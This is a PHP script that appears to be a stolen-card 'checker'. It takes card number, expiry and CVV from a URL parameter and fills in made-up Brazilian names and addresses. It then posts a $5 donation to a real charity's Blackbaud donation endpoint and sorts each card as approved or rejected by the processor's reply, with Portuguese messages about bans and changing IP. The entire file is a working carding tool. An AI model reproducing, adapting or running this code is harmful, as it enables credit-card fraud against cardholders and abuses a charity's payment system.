<?php
error_reporting(0);
set_time_limit(0);

function multiexplode ($delimiters,$string){
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;}

function getStr2($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = $_GET['lista'];
$lista = str_replace(" ", "", $lista);
$separadores = array(",","|",":","'"," ","~","»");
$explode = multiexplode($separadores,$lista);
$cc = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];


$number1 = substr($cc,0,4);
$number2 = substr($cc,4,4);
$number3 = substr($cc,8,4);
$number4 = substr($cc,12,4);

function inStr($s,$as){ 
$s=strtoupper($s); 
if(!is_array($as)) $as=array($as);
for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
return false; 
    }
    function dadosnome(){
        $nome = array("Gabriel","Jose","Eduardo","Victor","Rafael","Bruno","Douglas","'.$nome.'s","Matheus","Cleiton");
        $mynome = rand(0, sizeof($nome)-1);
        $nome = $nome[$mynome];
        return $nome;
    }
    function dadossobre(){
        $sobrenome = array("Silva","Ribeiro","Rocha","Lima","Godoy","Diniz","Andrade","Oliveira","Martins","Ferreira");
        $mysobrenome = rand(0, sizeof($sobrenome)-1);
        $sobrenome = $sobrenome[$mysobrenome];
        return $sobrenome;
    }
    function email($nome){
        $email = preg_replace('<\W+>', "", $nome).rand(0000,9999)."@hotmail.com";
        return $email;
    }

    $nome = dadosnome();
    $sobrenome = dadossobre();
    $email = email($nome);

switch ($mes) {
    case '01': $mes = '1';
        break;
    case '02': $mes = '2';
        break;
    case '03': $mes = '3';
        break;
    case '04': $mes = '4';
        break;
    case '05': $mes = '5';
        break;
    case '06': $mes = '6';
        break;
    case '07': $mes = '7';
        break;
    case '08': $mes = '8';
        break;
    case '09': $mes = '9';
        break;
}
switch ($ano) {
         case '20':$ano = '2020';break;
         case '21':$ano = '2021';break;
         case '22':$ano = '2022';break;
         case '23':$ano = '2023';break;
         case '24':$ano = '2024';break;
         case '25':$ano = '2025';break;
         case '26':$ano = '2026';break;
         case '27':$ano = '2027';break;
         case '28':$ano = '2028';break;
         case '29':$ano = '2029';break;
         case '30':$ano = '2030';break;
 }

$random = substr(str_shuffle(str_repeat("0123456789abcdefghijklmnopqrstuvwxyz", 8)), 0, 8);



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://bbox.blackbaudhosting.com/webforms/components/custom.ashx?handler=blackbaud.appfx.mongo.parts.postformhandler');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: bbox.blackbaudhosting.com',	
  'Accept: */*',
  'Referer: https://bbox.blackbaudhosting.com/webforms/custom/mongo/scripts/MongoServer.html?xdm_e=https%3A%2F%2Fwww.whcffm.com&xdm_c=default2419&xdm_p=1',
  'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Mobile Safari/537.36',
  'Origin: https://bbox.blackbaudhosting.com',
  'Connection: Keep-Alive',	
  'Content-Type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bboxdonation%24gift%24GivingLevel=rdGivingLevel6&bboxdonation%24gift%24txtAmountOther=%245.00&bboxdonation%24gift%24txtAmountPledge=&bboxdonation%24gift%24hdnGivingLevelButtonsEnabled=false&bboxdonation%24gift%24hdnPledgeDuration=&bboxdonation%24gift%24hdnPledgePayment=&bboxdonation%24gift%24hdnGiftButtonsStyle=&bboxdonation%24recurrence%24ddFrequency=0&bboxdonation%24recurrence%24ddFrequencyDate=1&bboxdonation%24recurrence%24hdnRecurringOnly=&bboxdonation%24recurrence%24hdnDateOptions=%5B%7B%22frequency%22%3A0%2C%22values%22%3A%221%22%2C%22paymentDates%22%3A%2210%2F02%2F2020%22%7D%2C%7B%22frequency%22%3A2%2C%22values%22%3A%2210%22%2C%22paymentDates%22%3A%2210%2F02%2F2020%22%7D%2C%7B%22frequency%22%3A3%2C%22values%22%3A%2210%22%2C%22paymentDates%22%3A%2210%2F02%2F2020%22%7D%5D&bboxdonation%24recurrence%24hdnRecurringOptionValue=1&bboxdonation%24designation%24ddDesignations=16&bboxdonation%24designation%24txtOtherDesignation=&bboxdonation%24comment%24txtComments=s2&bboxdonation%24payment%24BBFormPaymentChoice=0&bboxdonation%24payment%24txtCardholder='.$nome.'+Lima+'.$sobrenome.'&bboxdonation%24payment%24txtCardNumber='.$cc.'&bboxdonation%24payment%24cboCardType=b34832f7-8a95-47fa-9c43-bc8682562ea5&bboxdonation%24payment%24cboMonth='.$mes.'&bboxdonation%24payment%24cboYear='.$ano.'&bboxdonation%24payment%24txtCSC='.$cvv.'&bboxdonation%24payment%24txtBankName=&bboxdonation%24payment%24txtRoutingNumber=&bboxdonation%24payment%24ddAccountType=Checking&bboxdonation%24payment%24txtAccountNumber=&bboxdonation%24payment%24txtAccountHolder=&bboxdonation%24payment%24hdnDirectDebitLookupCount=0&bboxdonation%24payment%24hdnDirectDebitShouldLookup=0&bboxdonation%24payment%24hdnMerchantAccountId=120ce2c6-a8ed-4d04-808a-7c9e22770bf0&bboxdonation%24billing%24txtOrgName=&bboxdonation%24billing%24txtFirstName='.$nome.'&bboxdonation%24billing%24txtLastName='.$sobrenome.'&bboxdonation%24billing%24txtEmail='.$nome.'%40GMAIL.COM&bboxdonation%24billing%24txtPhone=20097116632&bboxdonation%24billing%24billingAddress%24ddCountry=United+States&bboxdonation%24billing%24billingAddress%24txtAddress=street+12312&bboxdonation%24billing%24billingAddress%24txtCity=ny&bboxdonation%24billing%24billingAddress%24ddState=NY&bboxdonation%24billing%24billingAddress%24txtZip=10080&bboxdonation%24billing%24billingAddress%24txtUKCity=ny&bboxdonation%24billing%24billingAddress%24ddUKCounty=&bboxdonation%24billing%24billingAddress%24txtUKPostCode=10080&bboxdonation%24billing%24billingAddress%24txtCACity=ny&bboxdonation%24billing%24billingAddress%24ddCAProvince=NY&bboxdonation%24billing%24billingAddress%24txtCAPostCode=10080&bboxdonation%24billing%24billingAddress%24txtAUCity=ny&bboxdonation%24billing%24billingAddress%24ddAUState=NY&bboxdonation%24billing%24billingAddress%24txtAUPostCode=10080&bboxdonation%24billing%24billingAddress%24ddNZSuburb=&bboxdonation%24billing%24billingAddress%24ddNZCity=&bboxdonation%24billing%24billingAddress%24txtNZPostCode=10080&bboxdonation%24hdnJsonFieldProps=&bboxdonation%24hdnMongoInstanceID=&bboxdonation%24hdnMetaTag=1&bboxdonation%24hdnEmailInfo=%7B%7D&bboxdonation%24hdnHideDirectDebitForOneTimeGift=&bboxdonation%24hdnDateTimeOffset=2020-02-09T21%3A52%3A09.788-03%3A00&bboxdonation%24hdnReCAPTCHASettings=%7B%22isEnabled%22%3Afalse%7D&bboxdonation%24hdnMixpanelToken=&bboxdonation%24hdnBBCheckoutPublicKey=&bboxdonation%24hdnBBCheckoutTransactionID=&bboxdonation%24hdnBBCheckoutCardToken=&bboxdonation%24hdnBBCheckoutProcessNow=&bboxdonation%24hdnBBCheckoutAmount=5.00&instanceId=39d5e25f-f9ad-4e18-bebf-21b1575e843c&partId=978a49f8-31ee-449f-bcc3-66e6c78bb3d3&srcUrl=https%3A%2F%2Fwww.whcffm.com%2Fblackbaud-donate.html&bboxdonation$btnSubmit=Donate');
$tok1 = curl_exec($ch);

include("consultabin.php");
$bin = "$pais $bandeira $banco $level";

if(InStr($tok1, 'Please call the number on the back of your card.')) {
		echo "<span class='badge badge-danger'>#Reprovada</span> ".$lista." <span class='badge badge-danger'>".$bin." </span> </span><span class='badge badge-dark'>  PAGAMENTO NÃO AUTORIZADO!  </span> </span> &nbsp <br>";
}elseif(InStr($tok1, 'Invalid credit card number.')){
		echo "<span class='badge badge-danger'>#Reprovada</span> ".$lista." <span class='badge badge-danger'>".$bin." </span> </span><span class='badge badge-dark'>  GERADA [SE CONTINUAR VAI LEVAR BAN]  </span> </span> &nbsp <br>";
}elseif(InStr($tok1, 'Thank you for your generous support!')){
		echo "<span class='badge badge-dark'>#Aprovada </span> ".$lista." <span class='badge badge-success'>".$bin." </span> </span><span class='badge badge-dark'>  PAGAMENTO AUTORIZADO! 00  </span> </span> &nbsp <br>";
}elseif(InStr($tok1, 'Invalid account number.')){
		echo "<span class='badge badge-danger'>#Invalido </span> ".$lista." <span class='badge badge-danger'>".$bin." </span></span><span class='badge badge-dark'>  GERADA [SE CONTINUAR VAI TOMAR BAN]  </span> </span> &nbsp <br>";
}elseif(InStr($tok1, 'Multiple attempts at using this credit card have resulted in errors.')){
		echo "<span class='badge badge-danger'>#Invalido </span> ".$lista." <span class='badge badge-danger'>".$bin." </span> </span><span class='badge badge-dark'>  RETESTE  </span> </span> &nbsp <br>";
}elseif(InStr($tok1, 'The client IP')){
		echo "<span class='badge badge-danger'>#Reprovada</span> ".$lista." <span class='badge badge-danger'>".$bin." </span> </span><span class='badge badge-dark'>  HORA DE TROCAR IP  </span> </span> &nbsp <br>";
}elseif(InStr($tok1, 'Please specify expiration')){
		echo "<span class='badge badge-danger'>#Invalido </span> ".$lista." <span class='badge badge-danger'>".$bin." </span><span class='badge badge-dark'>  DATA INVALIDA  </span></span> &nbsp <br>";
}elseif(InStr($tok1, 'The authorization request was declined')){
		echo "<span class='badge badge-dark'>Aprovada</span> ".$lista." <span class='badge badge-success'>".$bin." </span> </span><span class='badge badge-dark'>  PAGAMENTO AUTORIZADO! 01  </span> </span> &nbsp <br>"; 
}elseif(InStr($tok1, 'Invalid card verification number.')){
		echo "<span class='badge badge-danger'>#Reprovada</span> ".$lista." <span class='badge badge-danger'>".$bin." </span> </span><span class='badge badge-dark'> SALDO INSUFICIENTE </span> </span> &nbsp <br>";
}elseif(InStr($tok1, 'General system failure.')){
		echo "<span class='badge badge-danger'>#Invalido </span> ".$lista." <span class='badge badge-danger'>".$bin." </span> </span><span class='badge badge-dark'> FALHA NO SISTEMA </span> </span> &nbsp <br>";
}elseif(InStr($tok1, 'Stolen or lost card.')){
		echo "<span class='badge badge-danger'>#Reprovada</span> ".$lista." <span class='badge badge-danger'>".$bin." </span> </span><span class='badge badge-dark'> CARTÃO ROUBADO OU PERDIDO </span> </span> &nbsp <br>";
}elseif(InStr($tok1, 'Insufficient funds in the account.')){
    echo "<span class='badge badge-danger'>#Reprovada</span> ".$lista." <span class='badge badge-danger'>".$bin." </span> </span><span class='badge badge-dark'> SALDO INSUFICIENTE </span> </span> &nbsp <br>";
}elseif(InStr($tok1, 'Invalid expiry date.')){
    echo "<span class='badge badge-danger'>#Reprovada</span> ".$lista." <span class='badge badge-danger'>".$bin." </span> </span><span class='badge badge-dark'> DATA DE EXPIRAÇÃO INVALIDA </span> </span> &nbsp <br>";
}elseif(InStr($tok1, 'Please specify a valid email')){
    echo "<span class='badge badge-danger'>#Invalido</span> ".$lista." <span class='badge badge-danger'>".$bin." </span> </span><span class='badge badge-dark'> RETESTE </span> </span> &nbsp <br>";
}else{
		echo "<span class='badge badge-dark'>#Invalido </span> ".$lista." <span class='badge badge-danger'>".$bin." </span> [".$tok1."]  </span> &nbsp <br>";

}
?>